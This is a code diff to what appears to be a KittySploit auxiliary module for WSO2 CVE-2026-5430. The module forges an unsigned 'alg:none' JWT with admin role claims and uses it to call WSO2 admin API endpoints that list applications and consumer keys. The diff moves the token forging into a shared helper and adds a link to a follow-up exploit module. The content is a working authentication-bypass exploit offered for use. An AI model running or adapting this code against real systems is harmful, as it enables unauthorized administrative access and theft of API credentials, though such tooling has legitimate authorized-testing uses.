@@ -2,12 +2,12 @@
 # -*- coding: utf-8 -*-
 """WSO2 CVE-2026-5430 JWT alg:none admin API access via X-JWT-Assertion."""
 
-import base64
 import json
 import time
 
 from kittysploit import *
 from lib.protocols.http.http_client import Http_client
+from lib.protocols.http.jwt_none import forge_alg_none_jwt
 
 
 class Module(Auxiliary, Http_client):
@@ -50,7 +50,9 @@ class Module(Auxiliary, Http_client):
                     {"capability": "admin_access", "from_detail": "JWT bypass"},
                     {"capability": "credentials", "from_detail": "consumer keys"},
                 ],
-                "suggested_followups": [],
+                "suggested_followups": [
+                    "exploits/multi/http/wso2_cve_2026_5430_jwt_bypass",
+                ],
             },
         },
     }
@@ -59,23 +61,15 @@ class Module(Auxiliary, Http_client):
     list_apps = OptBool(True, "GET /api/am/admin/v4/applications", False)
     list_keys = OptBool(True, "GET /api/am/admin/v4/keys", False)
 
-    @staticmethod
-    def _forge_none_jwt(subject: str) -> str:
-        header = base64.urlsafe_b64encode(
-            json.dumps({"alg": "none", "typ": "JWT"}, separators=(",", ":")).encode()
-        ).decode().rstrip("=")
-        payload = base64.urlsafe_b64encode(
-            json.dumps(
-                {
-                    "sub": subject,
-                    "iss": "wso2.org/products/am",
-                    "http://wso2.org/claims/role": ["admin", "Internal/subscriber"],
-                    "exp": int(time.time()) + 7200,
-                },
-                separators=(",", ":"),
-            ).encode()
-        ).decode().rstrip("=")
-        return f"{header}.{payload}."
+    def _forge_jwt(self) -> str:
+        return forge_alg_none_jwt(
+            {
+                "sub": str(self.subject or "admin"),
+                "iss": "wso2.org/products/am",
+                "http://wso2.org/claims/role": ["admin", "Internal/subscriber"],
+                "exp": int(time.time()) + 7200,
+            }
+        )
 
     def _get(self, path: str, token: str):
         return self.http_request(
@@ -86,7 +80,7 @@ class Module(Auxiliary, Http_client):
         )
 
     def run(self):
-        token = self._forge_none_jwt(str(self.subject or "admin"))
+        token = self._forge_jwt()
         print_status("CVE-2026-5430 — WSO2 JWT alg:none admin access")
         hit = False
         if bool(self.list_apps):
